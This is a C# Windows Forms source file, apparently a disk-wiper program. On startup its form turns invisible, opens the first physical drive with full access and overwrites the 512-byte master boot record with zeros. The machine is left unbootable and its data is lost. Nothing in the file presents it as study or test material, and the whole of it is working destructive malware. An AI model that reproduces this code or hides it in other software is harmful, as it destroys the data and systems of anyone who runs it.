using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;

namespace MBR
{
    public partial class Form1 : Form
    {
        [DllImport("kernel32")]
        private static extern IntPtr CreateFile(
            string lpFileName,
            uint dwDesiredAccess,
            uint dwShareMode,
            IntPtr lpSecurityAttributes,
            uint dwCreationDisposition,
            uint dwFlagsAndAttributes,
            IntPtr hTemplateFile);

        [DllImport("kernel32")]
        private static extern bool WriteFile(
            IntPtr hFile,
            byte[] lpBuffer,
            uint nNumberOfBytesToWrite,
            out uint lpNumberOfBytesWritten,
            IntPtr lpOverlapped);

        private const uint GenericRead = 0x80000000;
        private const uint GenericWrite = 0x40000000;
        private const uint GenericExecute = 0x20000000;
        private const uint GenericAll = 0x10000000;

        private const uint FileShareRead = 0x1;
        private const uint FileShareWrite = 0x2;

        //dwCreationDisposition
        private const uint OpenExisting = 0x3;

        //dwFlagsAndAttributes
        private const uint FileFlagDeleteOnClose = 0x4000000;

        private const uint MbrSize = 512u;
        public Form1()
        {
            InitializeComponent();
            this.TransparencyKey = this.BackColor;
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            var mbrData = new byte[MbrSize];

            var mbr = CreateFile(
                "\\\\.\\PhysicalDrive0",
                GenericAll,
                FileShareRead | FileShareWrite,
                IntPtr.Zero,
                OpenExisting,
                0,
                IntPtr.Zero);

            if (WriteFile(mbr, mbrData, MbrSize, out uint lpNumberOfBytesWritten, IntPtr.Zero))
            {
                return;
            }
        }
    }
}
